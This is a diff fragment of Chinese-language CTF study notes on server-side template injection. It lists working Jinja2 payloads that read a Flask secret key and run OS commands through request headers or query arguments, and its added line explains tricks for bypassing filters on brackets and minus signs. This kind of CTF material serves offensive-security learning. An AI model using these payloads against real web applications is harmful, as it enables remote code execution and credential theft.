@@ -117,6 +117,7 @@ for i in range(300,1000):
     - 获取SECRET KEY：`{{self|attr("\x5f\x5fdict\x5f\x5f")}}`
 - [PickYourStarter](https://github.com/MasonCompetitiveCyber/PatriotCTF2023/tree/main/Web/pickyourstarter)
     - 可以用自定义header传命令：`{{joiner.__init__.__globals__.os.popen(request.headers.cmd).read()}}`,然后header里添加`cmd: cat flag.txt`
+`{{().__class__.__base__.__subclasses__().__getitem__(455)(request.args.shell,shell=True,stdout=(1).__neg__()).communicate()}}`:用getitem绕`[]`过滤，`(1).__neg__()`绕负号过滤
 - [Frog-WAF](https://fireshellsecurity.team/sekaictf-frog-waf-and-chunky/)
     - java ssti模板注入（[EL - Expression Language](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language)）。此题的难点在于waf，限制了所有数字和一些特殊符号与java的类名
     - 其他payload：
